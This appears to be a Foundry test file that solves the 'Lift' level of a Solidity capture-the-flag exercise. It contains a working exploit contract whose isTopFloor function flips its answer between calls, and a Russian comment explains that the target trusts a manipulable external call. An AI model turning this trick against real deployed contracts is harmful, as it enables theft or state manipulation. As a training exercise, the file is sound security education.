// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";
contract Exploiter is House {
    bool returnValue = true;  // Начинаем с true

    function attack(Lift target) external {
        target.goToFloor(1);
    }
    function isTopFloor(uint256) external returns (bool) {
        returnValue = !returnValue;
        return returnValue;
    }
}
// контракт Lift доверяет внешнему вызову, а выводом функции isTopFloor можно манипулировать
// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Exploiter exploiter = new Exploiter();
        exploiter.attack(instance);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}
